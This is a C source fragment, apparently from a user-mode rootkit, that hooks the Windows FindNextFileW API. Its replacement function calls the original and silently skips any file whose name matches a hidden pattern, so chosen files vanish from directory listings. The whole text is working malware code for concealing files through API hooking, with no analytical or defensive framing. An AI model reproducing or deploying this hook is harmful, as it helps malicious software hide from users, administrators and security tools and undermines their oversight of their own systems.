NEWAPI
BOOL
WINAPI
VFindNextFileW(
	HANDLE hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
	)
{
	BOOL retValue = FALSE;

	//find a file
	RESTORE_API(FindNextFileW);
	OLDCALL(FindNextFileW, 2);
	REPLACE_API(FindNextFileW);

	if (retValue)
	{
		if (!IsBadReadPtr(lpFindFileData, sizeof(WIN32_FIND_DATAW)))
		{
			//while we are finding a hidden file
			RESTORE_API(FindNextFileW);
			while (posw0(lpFindFileData->cFileName) != MAXDWORD)
			{
				//get next file
				retValue = FindNextFileW(hFindFile, lpFindFileData);

				//if there is no file to get then fail
				if (!retValue)
				{
					//we keep the error from FindNextFileW, NO SetLastError(ERROR_NO_MORE_FILES);
					break;
				}
			}
			REPLACE_API(FindNextFileW);
		}
	}
	return retValue;
}